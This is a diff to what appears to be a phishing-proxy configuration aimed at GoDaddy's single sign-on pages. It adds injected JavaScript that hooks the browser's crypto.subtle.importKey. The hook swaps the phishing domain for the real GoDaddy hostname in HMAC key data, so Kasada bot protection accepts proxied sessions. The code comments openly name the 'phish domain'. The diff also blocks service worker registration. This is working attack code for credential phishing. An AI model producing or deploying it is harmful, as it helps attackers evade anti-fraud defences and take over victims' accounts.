@@ -377,6 +377,42 @@ js_inject:
     trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
+        // ── Kasada HMAC hostname patch ───────────────────────────────────────────
+        // Kasada j-1.2.308 derives the X-Kpsdk-H HMAC key from window.location.hostname.
+        // When proxied, that is the phish domain — GoDaddy's Kasada server rejects it.
+        // Intercept crypto.subtle.importKey BEFORE the SDK loads: if the raw key bytes
+        // contain the proxy hostname, replace them with the real hostname so the HMAC
+        // is computed correctly. Runs in both the main page and the /fp iframe.
+        try {
+          var _kReal  = window.location.hostname.indexOf('sssn') === 0
+                        ? 'sso.secureserver.net'
+                        : 'sso.godaddy.com';
+          var _kProxy = window.location.hostname;
+          if (_kProxy !== _kReal && window.crypto && window.crypto.subtle) {
+            var _enc = new TextEncoder();
+            var _dec = new TextDecoder();
+            var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
+            var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
+            crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
+              if (fmt === 'raw' && keyData) {
+                try {
+                  var ab = keyData instanceof ArrayBuffer ? keyData
+                         : ArrayBuffer.isView(keyData)
+                           ? keyData.buffer.slice(keyData.byteOffset, keyData.byteOffset + keyData.byteLength)
+                           : null;
+                  if (ab) {
+                    var txt = _dec.decode(ab);
+                    if (txt.indexOf(_kProxy) !== -1) {
+                      keyData = _enc.encode(txt.replace(_re, _kReal));
+                    }
+                  }
+                } catch(_e) {}
+              }
+              return _origImport(fmt, keyData, algo, ext, uses);
+            };
+          }
+        } catch(_e) {}
+
         // Block new service worker registrations so they can't intercept requests.
         if ('serviceWorker' in navigator) {
           navigator.serviceWorker.register = function() { return Promise.resolve({}); };
